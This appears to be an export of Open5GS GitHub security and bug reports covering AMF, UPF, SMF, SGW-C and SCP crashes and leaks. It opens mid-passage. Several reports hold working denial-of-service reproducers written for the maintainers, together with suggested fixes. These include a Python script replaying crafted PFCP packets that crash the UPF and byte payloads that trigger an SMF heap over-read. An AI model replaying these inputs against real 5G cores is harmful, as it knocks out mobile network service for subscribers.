in the phase-separated verification run the 8 000-distinct-SD sweep added 8 000 counter and 8 000 gauge series plus +79 MiB (docker stats), and 10 idle minutes later +78.5 MiB was still held with every leaked series retained. 

The 8 000-identical-SD control sweep added only one deduped series pair, but still permanently retained +56 MiB (~7 KiB per request) of per-request handling state — measured flat across a second 10-minute idle watch — so the SMF sat +135 MiB above baseline with the only reclamation path being process shutdown; the /metrics scrape degraded from 0.045 s to 11-15 s.

items.title: AMF UE Context Resource Leak After SCTP Disconnection During Incomplete Registration

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
**Description**  
After a series of incomplete UE registration procedures where the NG‑RAN node closes the SCTP association after receiving a NAS Identity Request, the AMF exhausts its internal UE context pool. New registration attempts then fail with a `UE CONTEXT RELEASE COMMAND` containing cause `control processing overload`, even though no other UE contexts are active and only a single SCTP association exists.

The log from the AMF shows:  
`[amf] ERROR: Could not allocate amf_ue context from pool (../src/amf/context.c:1589)`

**Steps to Reproduce**  
1. Establish an NG‑C SCTP association between NG‑RAN node and AMF (NG Setup completes successfully).  
2. NG‑RAN node sends `INITIAL UE MESSAGE` with a Registration Request.  
3. AMF sends `DOWNLINK NAS TRANSPORT` containing an Identity Request.  
4. NG‑RAN node closes the SCTP association.  
5. Repeat steps 1-4 1024 times.  
6. Attempt a fresh NG Setup and a single `INITIAL UE MESSAGE` with a Registration Request.  

**Expected Behavior**  
- On SCTP disconnection, the AMF shall immediately release all UE‑associated logical NG‑connections that were using that transport association, as required by the NGAP protocol (TS 38.413 §6, §8.7.1, §8.7.4).  
- After each disconnection, the AMF internal UE context pool should be freed.  
- Subsequent registration attempts should succeed (assuming no other capacity limits).  

**Actual Behavior**  
- After multiple SCTP disconnections, the AMF’s UE context pool is exhausted.  
- New registration attempts are rejected with `UE CONTEXT RELEASE COMMAND cause = "control processing overload"`.  
- The AMF log reports: `[amf] ERROR: Could not allocate amf_ue context from pool (../src/amf/context.c:1589)`.  
- The rejection persists until the AMF is restarted.

**Impact**  
The AMF becomes unable to serve any new UE, despite having no real overload. Only a restart of the AMF restores the service.

**Additional Information** 
The leak only occurs when NG-RAN drops the SCTP association **before** the Identity Response is sent, but not after the Authentication Request.

items.title: [Bug]: UPF crash in stateful PFCP sequence with repeated malformed Outer Header Creation

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
**Update (August 2026):**

The original description below reflects the initial analysis performed when reporting the issue. Subsequent debugging and discussion with the Open5GS maintainers showed that the crash originates from an error-path state leak during failed GTP-U peer setup rather than from the Session Deletion itself. The reduced reproducer and detailed root-cause analysis are provided in the comments below.

---

### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

Start Open5GS v2.7.7 normally, with the UPF PFCP interface reachable at `127.0.0.7:8805`.

Then run the following minimal Python reproducer from a host that can reach the UPF N4 interface:

```python
#!/usr/bin/env python3
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.7"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8805
LOCAL_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8806

messages = [
    (
        "assoc_setup",
        "2005001500cdd700003c0005007f00000700600004ee023068",
    ),
    (
        "session_estab_outer_header_creation_fields_1",
        "21320067000000000000000000cde000003c0005007f0000070039000d0200000000f000781e7f0000070001001f003800020001001d000400000064000200050014000100006c0004000000010003001a006c000400000001002c00020200000400080054000402000102",
    ),
    (
        "session_estab_outer_header_creation_fields_2",
        "21320067000000000000000000f0c200003c0005007f0000070039000d0200000000f000b4657f0000070001001f003800020001001d000400000064000200050014000100006c0004000000010003001a006c000400000001002c00020200000400080054000402000102",
    ),
    (
        "session_del",
        "2136000c00000000f000b46500f0c300",
    ),
]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(0.5)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    sock.bind(("", LOCAL_PORT))
except OSError as e:
    print(f"Could not bind local UDP port {LOCAL_PORT}: {e}")
    sys.exit(1)

for i, (name, hex_msg) in enumerate(messages, start=1):
    data = bytes.fromhex(hex_msg)
    print(f"[>] {i}/{len(messages)} {name} len={len(data)}")
    sock.sendto(data, (HOST, PORT))

    try:
        resp, _ = sock.recvfrom(65535)
        print(f"[<] response len={len(resp)}")
    except socket.timeout:
        print("[<] no response")

    time.sleep(0.05)

sock.close()
print("Done. Check whether open5gs-upfd is still running.")
```

Run:

```bash
python3 open5gs_upf_unknown_family_repro.py 127.0.0.7 8805 8806
```

After replaying the sequence, check the UPF process:

```bash
pgrep -af open5gs-upfd || echo "open5gs-upfd is down"
```



### Logs

```shell
Relevant UPF log excerpt during the replay:


[upf] INFO: PFCP associated [127.0.0.7]:8805 [127.0.0.1]:8806 (../src/upf/pfcp-sm.c:168)

[upf] INFO: [Added] Number of UPF-Sessions is now 1 (../src/upf/context.c:212)
[gtp] WARNING: gtp_connect() [::]:2152 failed (../lib/gtp/path.c:72)
[pfcp] ERROR: ogs_gtp_connect() failed (../lib/pfcp/context.c:1222)
[upf] FATAL: CHECK CONFIGURATION: upf.gtpu (../src/upf/n4-handler.c:141)
[upf] FATAL: ogs_pfcp_setup_far_gtpu_node() failed (../src/upf/n4-handler.c:142)
[upf] ERROR: ogs_pfcp_extract_node_id() failed type [51] pfcp_status [4] from [127.0.0.7]:8805 (../src/upf/pfcp-path.c:114)

[upf] INFO: [Added] Number of UPF-Sessions is now 2 (../src/upf/context.c:212)
[pfcp] FATAL: Unknown family(0) (../lib/pfcp/context.c:1744)
[core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

The UPF should reject malformed PFCP Session Establishment / Session Deletion input gracefully and return an appropriate PFCP error cause, or ignore the malformed message.

It should not call `ogs_fatal()` / `abort()` or terminate the `open5gs-upfd` process.


### Observed Behaviour

### Summary

The Open5GS UPF process crashes on `v2.7.7` after replaying a short stateful PFCP sequence involving repeated malformed `Outer Header Creation` fields.

The minimized reproducer contains four PFCP messages:

1. PFCP Association Setup Request
2. PFCP Session Establishment Request with malformed Outer Header Creation fields
3. PFCP Session Establishment Request with malformed Outer Header Creation fields
4. PFCP Session Deletion Request

The UPF terminates with:

```text
[pfcp] FATAL: Unknown family(0) (../lib/pfcp/context.c:1744)
[core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Reproducer characteristics

The minimal reproducer is the following four-message PFCP sequence:

```text
assoc_setup
session_estab_outer_header_creation_fields
session_estab_outer_header_creation_fields
session_del
```

Removing any one of these four messages prevents the crash in my tests. In particular, removing the final PFCP Session Deletion Request makes the UPF stay alive, so the reproducer should be considered a four-message stateful sequence, not a three-message one.

I also reproduced the same fatal signature when additional PFCP messages were present between the relevant steps. This suggests that the crash is related to persistent UPF/PFCP state across multiple messages, rather than a single isolated malformed packet.

The observed fatal signature is:

```text
Unknown family(0) (../lib/pfcp/context.c:1744)
```

### Relation to potential duplicates

GitHub suggested #4491 and #4423 as potential duplicates.

I do not think #4491 is the same issue because it concerns crafted GTP-U traffic on UDP/2152 and a SIGSEGV/exit 139 on the GTP-U receive datapath. This report is about PFCP/N4 traffic on UDP/8805 and terminates with:

```text
Unknown family(0) (../lib/pfcp/context.c:1744)
```

#4423 is related because it also involves UPF crashes around `OuterHeaderCreation`, but it describes a zero-length `OuterHeaderCreate` IE in a single PFCP Session Establishment Request. This reproducer is different: it uses a four-message stateful PFCP sequence, the OHC IE is not the zero-length case, and removing any one of the four messages prevents reproduction in my tests.



### eNodeB/gNodeB

items.title: [Bug]: Repeated GTP-U Error Indications can crash SMF during EPC bearer deactivation

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

1. Establish an EPC PDN connection with a default bearer.
2. Have the SGW-U send two PFCP Session Report Requests containing an Error Indication Report for the same S5-U bearer before the first deactivation procedure completes.
3. The SMF processes both Error Indications independently and starts two deactivation procedures with `Reactivation Requested.`
4. Do not send Delete Bearer Responses from the SGW-C.
5. When the Delete Bearer transactions time out, each timeout starts its own PFCP Session Modification with `OGS_PFCP_MODIFY_REMOVE`  for the same bearer.
6. The first PFCP Session Modification Response removes the bearer. The second response attempts to remove the same bearer again.

### Logs

```shell
The captured SMF log shows two Error Indications for the same default bearer, EBI 5, received one millisecond apart at `10:29:36.405` and `10:29:36.406`.

Both reports start separate bearer deactivation procedures. After the first PFCP removal completes, the second PFCP Session Modification Response reaches `smf_epc_n4_handle_session_modification_response()` with no corresponding bearer and aborts at:


ogs_assert(bearer)
```

### Expected behaviour

While a bearer deactivation triggered by a GTP-U Error Indication is in progress, repeated Error Indications for the same bearer should be coalesced.

For the default bearer, the in-progress state should cover the entire PDN connection because its deactivation releases all bearers belonging to that session.

If a Delete Bearer Request for the default bearer times out, the SMF should release the entire PDN connection rather than removing only the default bearer.

The SMF should neither attempt to remove the same bearer more than once nor leave a live EPC session without a default bearer.

### Observed Behaviour

Every Error Indication starts a new bearer deactivation without checking whether one is already in progress. A single stale F-TEID can therefore produce multiple PFCP deactivations and multiple Delete Bearer Requests for the same bearer.

If the SGW-C does not answer those requests, every GTP transaction timeout sends a separate `OGS_PFCP_MODIFY_REMOVE`. The first successful PFCP modification removes the bearer, and a later response triggers `ogs_assert(bearer)` while processing the same bearer again.

In addition, `bearer_timeout()` does not distinguish the default bearer from a dedicated bearer. It removes either one using a single-bearer PFCP modification. Removing the default bearer this way leaves a live EPC session with an empty `bearer_list`, although EPC handlers assume that `smf_default_bearer_in_sess()` returns a valid bearer.

items.title: [Bug]: Heap-buffer-overflow in ogs_nas_5gs_decode_session_ambr() (5GSM Session-AMBR IE) reachable from a UE via N1 SM

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
## Open5GS Release, Revision, or Tag
v2.7.2, v2.8.0, main tested at `d261bd43` (v2.8.0-82-gd261bd4).

**Still present on current main** — source-checked 2026-09-09 against
`raw.githubusercontent.com/open5gs/open5gs/main`: the function is unchanged and
has no fixed-content validation. No upstream commit touches
`ogs_nas_5gs_decode_session_ambr` after `d261bd43` (latest `lib/nas/5gs/ies.c`
commits are the #3622 hardening, the Rel-19 regeneration, the DNN/APN
uninitialized-read fix and a SEC batch).

## Affected components
- `lib/nas/5gs/ies.c`, `ogs_nas_5gs_decode_session_ambr()`
  - v2.7.2: lines 4008-4031 · v2.8.0: 5570-5600 · main (`d261bd43`): 5571-5601
  - two OOB read sites: `downlink.value` and `uplink.value`
- Callers: `lib/nas/5gs/decoder.c`
  (`ogs_nas_5gs_decode_pdu_session_establishment_accept`:3654,
   `ogs_nas_5gs_decode_pdu_session_modification_command`:4468)
  ← `ogs_nas_5gsm_decode` ← `src/smf/smf-sm.c:1404` (SMF_EVT_5GSM_MESSAGE) and
  `src/smf/nsmf-build.c:213/439` (`n1SmBufFromUe`).

## Security impact
CVSS v3.1: **5.3 (Medium)** — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L`

Rationale: heap out-of-bounds read of 2 bytes on an attacker-influenced NAS
decode path in the SMF. Under ASan the SMF aborts; without ASan it is an
out-of-bounds read that can leak adjacent heap bytes into the decoded value and
may crash depending on heap layout. No write primitive, so integrity is not
rated. An SMF abort affects the AMF/UPF sessions it serves (control-plane DoS).
Maintainers are welcome to re-rate.

## Summary
`ogs_nas_5gs_decode_session_ambr()` validates only the presence of the length
octet and the *declared* LV length, then performs two unconditional
fixed-offset reads of the IE value fields through a stale buffer pointer. A
5GSM message carrying a truncated Session-AMBR IE therefore reads past the end
of the NAS message buffer (ASan: `heap-buffer-overflow`, READ of size 2).

```c
    if (pkbuf->len < 1) { ... return -1; }
    source = (ogs_nas_session_ambr_t *)pkbuf->data;
    session_ambr->length = source->length;
    size = session_ambr->length + sizeof(session_ambr->length);
    if (ogs_pkbuf_pull(pkbuf, size) == NULL) { ... return -1; } /* declared LV only */
    if (sizeof(*session_ambr) < size) return -1;
    memcpy(session_ambr, pkbuf->data - size, size);

    session_ambr->downlink.value = be16toh(source->downlink.value); /* OOB read */
    session_ambr->uplink.value   = be16toh(source->uplink.value);   /* OOB read */
```

## Root cause
The guards only ensure (a) at least 1 byte exists and (b) the *declared* length
is present; they never ensure the fixed bytes read at the end exist. Both read
sites are reachable: declared length <= 2 crosses the end at the first read,
declared length 3..5 crosses it at the second.

The v2.8.0 hardening (#3622) added `pkbuf->len < N` guards to the decoders that
read a 2-byte `source->length` (25 such functions were unguarded in v2.7.2 and
are all guarded from v2.8.0), but it does not cover these **value-field**
reads. This function is the residual member of that family, which is why it
still crashes on main.

## Trigger path
SMF decodes 5GSM NAS PDUs that originate from the UE over N1
(`SMF_EVT_5GSM_MESSAGE`, plus the `n1SmBufFromUe` decode in `nsmf-build.c`).
The 5GSM dispatcher routes on the message-type octet only, so an authenticated
UE can place a 5GSM payload whose type is `0xc2` (PDU session establishment
accept) or `0xcb` (PDU session modification command) inside its uplink NAS
payload container; the Session-AMBR IE decode over-reads before any
higher-level state machine runs.

## Steps to reproduce
1. Build Open5GS (v2.7.2 / v2.8.0 / main `d261bd43`) with
   `-fsanitize=address` (clang-14).
2. Compile the standalone harness below (it feeds raw bytes into
   `ogs_nas_5gsm_decode()`), e.g.
   `clang -g -O1 -fsanitize=address -I<src>/lib harness.c <build>/lib/nas/5gs/libogsnas-5gs.a <build>/lib/proto/libogsproto.a <build>/lib/core/libogscore.a -lpthread -lm -ltalloc -o decode_check_5gsm`
3. First read site (8 bytes):
   `printf '\x29\x2e\x01\xc2\xfe\x00\x00\x00' > min.bin`
4. `./decode_check_5gsm min.bin` → ASan abort.
5. Second read site (`uplink.value`, declared length 3):
   `printf '\x0e\x0e\x0e\xcb\x01\xc5\x3d\x2a\x03\x01\x02\x03' > min2.bin`
   → ASan abort.
6. The same payload also aborts a **running SMF**: it was delivered through the
   SBI create path (`POST /nsmf-pdusession/v1/sm-contexts`, binary part
   `content-id: 5gnas-sm`) and the SMF aborted with the identical stack.

<details>
<summary>Standalone harness (decode_check_5gsm.c)</summary>

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "ogs-core.h"
#include "nas/5gs/ogs-nas-5gs.h"

extern int ogs_nas_5gsm_decode(ogs_nas_5gs_message_t *message, ogs_pkbuf_t *pkbuf);
int __ogs_nas_domain;

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "usage: %s <payload.bin>\n", argv[0]); return 2; }

    FILE *fp = fopen(argv[1], "rb");
    if (!fp) { perror("open"); return 2; }
    fseek(fp, 0, SEEK_END); long n = ftell(fp); fseek(fp, 0, SEEK_SET);
    uint8_t *buf = malloc(n);
    if (fread(buf, 1, n, fp) != (size_t)n) { perror("read"); return 2; }
    fclose(fp);

    ogs_core_initialize();
    ogs_log_install_domain(&__ogs_nas_domain, "nas", OGS_LOG_NONE);
    ogs_pkbuf_config_t cfg;
    ogs_pkbuf_default_init(&cfg);
    ogs_pkbuf_default_create(&cfg);

    ogs_pkbuf_t *pkbuf = ogs_pkbuf_alloc(NULL, n);
    if (!pkbuf) { fprintf(stderr, "no pkbuf\n"); return 2; }
    memcpy(ogs_pkbuf_put(pkbuf, n), buf, n);

    ogs_nas_5gs_message_t msg;
    memset(&msg, 0, sizeof(msg));
    int rv = ogs_nas_5gsm_decode(&msg, pkbuf);
    printf("ogs_nas_5gsm_decode() returned %d\n", rv);
    ogs_pkbuf_free(pkbuf);
    free(buf);
    return 0;
}
```
</details>

## Expected behaviour
For a 5GSM message whose Session-AMBR IE content is shorter than the fixed
6 octets defined in TS 24.501 §9.11.4.14, the decoder should reject / ignore the
IE (return -1) and must not read beyond `pkbuf->data + pkbuf->len`. The SMF must
remain alive.

## Observed Behaviour
```
AddressSanitizer: heap-buffer-overflow, READ of size 2 in
ogs_nas_5gs_decode_session_ambr
  main     ies.c:5594 (downlink.value), 5595 (uplink.value)
  v2.8.0   ies.c:5593 / 5594
  v2.7.2   ies.c:4535 / 4536
#0 ogs_nas_5gs_decode_session_ambr
#1 ogs_nas_5gs_decode_pdu_session_establishment_accept (decoder.c:3654)
#2 ogs_nas_5gsm_decode (decoder.c:5316)
```
Both read sites are reachable depending on the declared LV length (<=2 → first
site, 3..5 → second site). The process aborts under ASan.

## Logs
<details>
<summary>ASan report (main, standalone harness)</summary>

```
==4739==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110000004ca
READ of size 2 at 0x6110000004ca thread T0
    #0 0x... in ogs_nas_5gs_decode_session_ambr .../src/lib/nas/5gs/ies.c:5594:36
    #1 0x... in ogs_nas_5gs_decode_pdu_session_establishment_accept .../src/lib/nas/5gs/decoder.c:3654:12
    #2 0x... in ogs_nas_5gsm_decode .../src/lib/nas/5gs/decoder.c:5316:16
SUMMARY: AddressSanitizer: heap-buffer-overflow .../src/lib/nas/5gs/ies.c:5594:36 in ogs_nas_5gs_decode_session_ambr
```
</details>

`smf_stderr_asan.log` (full SMF stderr, from the live-SMF run) is attached.

## Related but distinct
This is **not** GHSA-9643-6pmq-j7g2 ("SMF heap out-of-bounds read via truncated
N1 SM container"): that report concerns casting an N1 SM container shorter than
the 4-byte 5GSM header at `amf/gmm-handler.c:1239` / `smf/nsmf-handler.c:90`.
This issue is a different function (`ies.c`, Session-AMBR IE decode) and a
different root cause (value-field fixed-offset read after LV validation).

## Suggested fix
```diff
--- a/lib/nas/5gs/ies.c
+++ b/lib/nas/5gs/ies.c
@@
     session_ambr->length = source->length;
+    if (session_ambr->length != 6) {   /* fixed contents, TS 24.501 9.11.4.14 */
+        ogs_error("Invalid Session-AMBR length [%d]", session_ambr->length);
+        return -1;
+    }
     size = session_ambr->length + sizeof(session_ambr->length);
```
Alternatively, perform the two byte-swap reads on the size-bounded local copy
and require `size == sizeof(ogs_nas_session_ambr_t)`. Either covers both read
sites.

## Environment
Open5GS built with `-fsanitize=address` (clang-14), x86_64. Found while fuzzing
the NAS 5GSM decoder (`ogs_nas_5gsm_decode`) with libFuzzer + ASan; the same
input was then reproduced against a running SMF via the SBI create path.

Happy to submit a PR with the fix above.

## eNodeB/gNodeB
Not applicable for the decoder-level PoC. The live reproduction used the SMF
SBI create path (no gNB/UE required). A realistic attacker is an authenticated
UE (UE → UL NAS transport → AMF → SMF SBI), which we verified separately.

## UE Models and versions
Not applicable for the decoder PoC; realistic attacker path was verified with
an authenticated UE.

items.title: [Bug]: SGW-C leaves an empty session after default bearer deletion failure

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

## Describe the bug

SGW-C can leave an `sgwc_sess_t` with an empty `bearer_list` after processing a Delete Bearer Response for the default bearer. The stale session later causes an assertion failure in `Release Access Bearers Request`.

This is a different path from the previously fixed Delete Bearer timeout issue.

The timeout path was fixed by deleting the entire PFCP session when the default bearer times out. However, the same empty-session state can still be created in the normal Delete Bearer Response path.

The issue occurs when the PGW/SMF initiates deletion of the default bearer (PDN connection), but the MME returns a failure response without `Linked EPS Bearer ID` and without Bearer Contexts.

SGW-C currently classifies the cleanup based on the **Delete Bearer Response IEs**, and therefore removes only the default bearer instead of deleting the entire session.

This leaves:

- `sgwc_sess_t` still attached to `sgwc_ue->sess_list`
- `sess->bearer_list` empty

Later, when the UE receives a Release Access Bearers Request, SGW-C aborts at:

```c
ogs_assert(ogs_list_count(&sess->bearer_list));
```

## To Reproduce

One observed sequence was:

1. SMF receives an Error Indication for the IMS default bearer.
2. SMF sends Delete Bearer Request for the default bearer.
3. MME returns Delete Bearer Response with:
   - Cause = 90
   - no Linked EPS Bearer ID
   - no Bearer Contexts
4. SGW-C removes only the default bearer.
5. The session remains in `sgwc_ue->sess_list` with zero bearers.
6. A later Release Access Bearers Request crashes SGW-C.

### Logs

```shell
[SMF]
Error Indication from SGW-U [EBI:6]
Delete Bearer Request (default bearer)

[MME -> SGW-C]
Delete Bearer Response
    Cause = 90
    No Bearer
    No EPS Bearer ID

[SGW-C]
Unknown EPS Bearer ID[6]

Later:

Release Access Bearers Request

FATAL:
No Bearer
[imsi:418920000000961 sess_id:357 apn:ims]
Assertion `ogs_list_count(&sess->bearer_list)' failed
```

### Expected behaviour

The cleanup should follow the semantics of the original Delete Bearer Request rather than the response IEs.

If the original request targets the default bearer (PDN connection), SGW-C should delete the entire PFCP session even if the Delete Bearer Response omits `Linked EPS Bearer ID` or Bearer Contexts.

An empty session should never remain in `sgwc_ue->sess_list`.


### Observed Behaviour

SGW-C removes only the default bearer when it receives a Cause-only Delete Bearer Response without `Linked EPS Bearer ID` or Bearer Contexts.

As a result, the `sgwc_sess_t` remains in `sgwc_ue->sess_list` with an empty bearer_list.

A later Release Access Bearers Request walks the stale session and aborts at:

```
ogs_assert(ogs_list_count(&sess->bearer_list));
```

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

Start Open5GS SCP on 127.0.0.200:7777 and NSSF on 127.0.0.14:7777. First verify that an HTTP/2 request sent through the SCP with “User-Agent: AMF” and “3gpp-sbi-target-apiroot: http://127.0.0.14:7777” reaches NSSF. Stop NSSF with “sudo systemctl stop open5gs-nssfd”, confirm that 127.0.0.14:7777 is no longer listening, and send the same request through the SCP again. The request used GET /nnssf-nsselection/v2/network-slice-information with valid query parameters. Restart NSSF after reproducing the issue.

### Logs

```shell
When NSSF is unavailable, a direct request fails with ConnectionRefusedError, while the request through SCP returns HTTP 500 with the ProblemDetails response {"title":"response_handler() failed","status":500}. NSSF was then restarted successfully and the same request returned its original HTTP 400 business response. The SCP and NSSF processes did not crash.
```

### Expected behaviour

When the target NF cannot be reached, the SCP should return an appropriate gateway or service-availability status such as HTTP 502, 503, or 504 with a clear ProblemDetails response indicating that the target NF is unavailable. A downstream connection failure should not be exposed as a generic HTTP 500 internal server error.

### Observed Behaviour

The SCP returns HTTP 500 with {"title":"response_handler() failed","status":500} when the configured target NSSF is stopped and its SBI port refuses connections. The response does not identify the target NF availability problem. After NSSF is restarted, the same request returns the original NSSF business response, confirming that the HTTP 500 is specifically caused by target NF unavailability.

[nssf_outage_recovery.zip](https://github.com/user-attachments/files/29927688/nssf_outage_recovery.zip)

### eNodeB/gNodeB

Not applicable. The issue is reproduced directly over the HTTP/2 SBI interface and does not require a gNodeB.

### UE Models and versions

Not applicable. No UE is required to reproduce this SCP error-handling issue.

items.title: [Bug]: AMF DoS via unchecked NULL RAN-UE context in amf_nnrf_handle_nf_discover() during delayed NRF Discovery response

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

AMF crashes in `amf_nnrf_handle_nf_discover()` when a delayed NRF Discovery response arrives after the associated RAN-UE context has already been removed.

The affected path resolves the stored `ran_ue_id` with `ran_ue_find_by_id()` and immediately asserts the result with `ogs_assert(ran_ue)`. If the RAN-UE context no longer exists, `ran_ue_find_by_id()` returns NULL and the assertion terminates the AMF process.

The v2.7.7 release includes several AMF/SBI race-condition fixes, including PR #4081, #4178, and #4346. However, this specific NRF Discovery callback path still lacks the corresponding NULL check after `ran_ue_find_by_id()`.

A related guarded timer-expiry path in `src/amf/amf-sm.c` already handles this case:

```c
// src/amf/amf-sm.c - related guarded timer-expiry path
if (ran_ue_id < OGS_MIN_POOL_ID || ran_ue_id > OGS_MAX_POOL_ID) {
    ogs_error("No assoc RAN-UE id [%d]", ran_ue_id);
    break;
}
ran_ue = ran_ue_find_by_id(ran_ue_id);
if (!ran_ue) {
    ogs_error("[%s:%s:%d:%d] "
            "NG Context has already been removed",
            amf_ue->supi, amf_ue->suci, sess->psi, sess->pti);
    break;
}
```

By contrast, the NRF Discovery callback path reaches `ogs_assert(ran_ue)` without equivalent NULL handling:

```c
// src/amf/nnrf-handler.c:88-89
ran_ue = ran_ue_find_by_id(ran_ue_id);
ogs_assert(ran_ue);   // NULL -> ogs_abort() -> AMF crash
```

### Conditions observed in the controlled reproduction

The crash was reliably reproduced when the following conditions coincided:

1. SMF absent from AMF's NF instance cache
   - For example, after SMF crash, restart, or deregistration.

2. NRF Discovery response delayed
   - For example, due to network delay, NRF overload, or controlled delayed response in a lab environment.

3. gNB N2 connection terminated during the discovery window
   - For example, SCTP association shutdown/abort, gNB restart, NG Reset, or UE context release.
   - RLF may indirectly lead to UE context release depending on implementation, but RLF itself is not an SCTP shutdown mechanism.

4. SCP discovery disabled or unavailable
   - When SCP is reachable, discovery may route via `client_discover_cb`, which already contains NULL handling for a removed RAN-UE context.
   - This condition is realistic for lab, research, or minimal deployments where the SCP process is not deployed, disabled, or unavailable.

> Note: Open5GS v2.7.7's packaged default `amf.yaml` includes an active SCP client URI (`http://127.0.0.200:7777`), while the direct NRF client URI is commented out. The crash was reproduced in a lab configuration where the NRF Discovery response reached `amf_nnrf_handle_nf_discover()`.

### Lab reproduction sequence

1. Existing lab gNB connects to AMF N2 over SCTP port 38412.

2. UE attaches and requests a PDU Session.

3. SMF is absent from the AMF NF instance cache.

4. AMF sends an asynchronous NRF Discovery request through the NSSF-assisted discovery path.

5. During the discovery window, the lab gNB process is terminated.

6. AMF handles the N2 termination and removes the associated RAN-UE context.

7. The delayed NRF Discovery response arrives.

8. `amf_nnrf_handle_nf_discover()` is invoked.

9. `ran_ue_find_by_id(ran_ue_id)` returns NULL.

10. `ogs_assert(ran_ue)` fails and AMF terminates via `ogs_abort()`.

Primary reproduction result:

- Scapy SCTP ABORT method: 5/5 successful reproductions under controlled lab conditions.
- Additional validation: graceful SCTP shutdown via lab gNB SIGTERM reproduced the same AMF crash condition.

### Suggested fix

Apply a defensive NULL-check pattern consistent with existing guarded paths. The following is an illustrative defensive pattern; maintainers may adapt the cleanup path to the existing SBI transaction lifecycle:

```c
// src/amf/nnrf-handler.c - suggested defensive pattern
// BEFORE:
ogs_assert(ran_ue_id >= OGS_MIN_POOL_ID && ran_ue_id <= OGS_MAX_POOL_ID);
ran_ue = ran_ue_find_by_id(ran_ue_id);
ogs_assert(ran_ue);

// AFTER:
if (ran_ue_id < OGS_MIN_POOL_ID || ran_ue_id > OGS_MAX_POOL_ID) {
    ogs_error("No assoc RAN-UE id [%d]", ran_ue_id);
    ogs_sbi_xact_remove(xact);
    return;
}

ran_ue = ran_ue_find_by_id(ran_ue_id);
if (!ran_ue) {
    ogs_error("NG Context has already been removed");
    ogs_sbi_xact_remove(xact);
    return;
}
```

Additional recommendations:

- Cancel in-flight NRF Discovery transactions when `ran_ue_remove()` is called.
- Audit all `amf_sess_sbi_discover_and_send()` call sites in `ngap-handler.c` for the same race pattern.

### Relevant code paths

- Vulnerable path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/nnrf-handler.c#L88-L89
- RAN-UE ID snapshot: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/sbi-path.c#L220-L229
- Existing guarded timer path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/amf-sm.c#L888-L900
- Existing guarded SCP callback path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/sbi-path.c#L322-L370

### Logs

```shell
Combined lab timeline (2026-05-03 UTC):

The timeline combines AMF logs and lab-control events recorded during reproduction.

15:43:12.560  NF_DEREGISTERED [type:SMF] - SMF removed from NF cache
15:43:22.205  Number of AMF-Sessions is now 1 - PDU Session created
15:43:22.206  No V-SMF Instance - NSSF fallback triggered
15:43:22.206  Try to discover [nnssf-nsselection] - NRF Discovery sent
15:43:22.986  SIGTERM sent to lab nr-gnb - SCTP graceful shutdown - ran_ue freed
15:43:28.651  FATAL: Assertion `ran_ue' failed. (nnrf-handler.c:89)

Crash log:

05/03 15:43:28.651: [amf] FATAL: amf_nnrf_handle_nf_discover:
    Assertion `ran_ue' failed. (../src/amf/nnrf-handler.c:89)

05/03 15:43:28.652: [core] FATAL: backtrace() returned 8 addresses
    (../lib/core/ogs-abort.c:37)

Primary reproduction — Scapy SCTP ABORT method (2026-05-03), 5/5:

Trial 1: PID 1048776 -> 1050641 | FATAL=2
Trial 2: PID 1051542 -> 1053085 | FATAL=2
Trial 3: PID 1053974 -> 1055504 | FATAL=2
Trial 4: PID 1056406 -> 1057950 | FATAL=2
Trial 5: PID 1059542 -> 1060673 | FATAL=2

Additional validation — graceful SCTP shutdown via lab gNB SIGTERM:

PID 963525 -> 964728 | FATAL=2 | Crash time: 2026-05-03 15:43:28.651 UTC
```

### Expected behaviour

AMF should handle the case where `ran_ue_find_by_id()` returns NULL gracefully.

Expected behavior:

- Log an error indicating that the associated RAN-UE context has already been removed.
- Clean up or remove the corresponding SBI transaction as appropriate.
- Return from the NRF Discovery callback without aborting the AMF process.
- Continue serving other active UE sessions.

This behavior would be consistent with existing guarded paths, such as the timer-expiry path in `src/amf/amf-sm.c`, where a missing RAN-UE context is handled without terminating AMF.

### Observed Behaviour

The AMF process terminates immediately when the delayed NRF Discovery response is processed after the associated RAN-UE context has already been removed.

Observed behavior:

- `amf_nnrf_handle_nf_discover()` receives the delayed NRF Discovery response.
- The stored `ran_ue_id` no longer resolves to a valid RAN-UE context.
- `ran_ue_find_by_id(ran_ue_id)` returns NULL.
- `ogs_assert(ran_ue)` fails.
- AMF terminates via `ogs_abort()`.
